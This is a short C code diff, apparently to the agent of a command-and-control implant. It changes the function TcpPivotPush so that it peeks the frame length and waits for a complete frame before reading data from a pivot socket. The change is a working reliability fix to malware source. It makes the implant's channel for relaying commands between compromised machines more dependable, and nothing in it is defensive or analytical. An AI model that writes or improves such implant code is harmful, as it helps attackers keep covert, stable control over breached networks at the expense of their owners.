@@ -198,17 +198,39 @@ VOID TcpPivotPush( VOID )
             }
 
             if ( BytesAvail >= sizeof( UINT32 ) ) {
+                UINT32   PeekLen  = 0;
                 UINT32   FrameLen = 0;
                 PBYTE    Buf      = NULL;
                 PPACKAGE Package  = NULL;
 
-                if ( ! TcpRecvAll( List->Socket, (PBYTE)&FrameLen, 4 ) ) {
+                /* Peek the 4-byte length prefix without consuming it so we can
+                   check that the full frame has arrived before reading anything.
+                   The socket is non-blocking: a partial frame would make the
+                   body TcpRecvAll return WSAEWOULDBLOCK → Dead=TRUE incorrectly. */
+                if ( Instance->Win32.recv( List->Socket, (PCHAR)&PeekLen, 4, MSG_PEEK ) != 4 ) {
+                    break;
+                }
+
+                FrameLen = __builtin_bswap32( PeekLen );
+
+                /* Re-query so BytesAvail reflects what arrived after the peek. */
+                if ( Instance->Win32.ioctlsocket( List->Socket, FIONREAD, &BytesAvail ) == SOCKET_ERROR ) {
                     Dead = TRUE;
                     break;
                 }
 
-                FrameLen = __builtin_bswap32( FrameLen );
-                Buf      = Instance->Win32.LocalAlloc( LPTR, FrameLen );
+                /* Wait until the full frame (length prefix + body) has arrived. */
+                if ( BytesAvail < sizeof( UINT32 ) + FrameLen ) {
+                    break;
+                }
+
+                /* Now consume the length prefix. */
+                if ( ! TcpRecvAll( List->Socket, (PBYTE)&PeekLen, 4 ) ) {
+                    Dead = TRUE;
+                    break;
+                }
+
+                Buf = Instance->Win32.LocalAlloc( LPTR, FrameLen );
 
                 if ( TcpRecvAll( List->Socket, Buf, FrameLen ) ) {
                     Package = PackageCreate( DEMON_COMMAND_PIVOT );
